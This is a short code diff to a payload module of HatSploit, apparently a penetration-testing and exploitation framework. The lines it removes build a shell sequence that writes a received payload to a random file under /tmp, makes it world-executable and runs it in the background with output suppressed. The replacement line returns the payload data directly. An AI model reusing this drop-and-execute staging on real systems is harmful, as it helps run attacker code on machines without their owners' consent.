@@ -88,12 +88,4 @@ class HatSploitPayload(Payload, TCPClient, StringTools):
             self.output_error("Failed to generate payload!")
             return
 
-        filename = self.random_string()
-
-        instructions = ""
-        instructions += f"cat >/tmp/{filename};"
-        instructions += f"chmod 777 /tmp/{filename};"
-        instructions += f"sh -c '/tmp/{filename} {remote_data}' 2>/dev/null &"
-        instructions += "\n"
-
-        return payload, HatSploitSession
+        return payload, remote_data, HatSploitSession
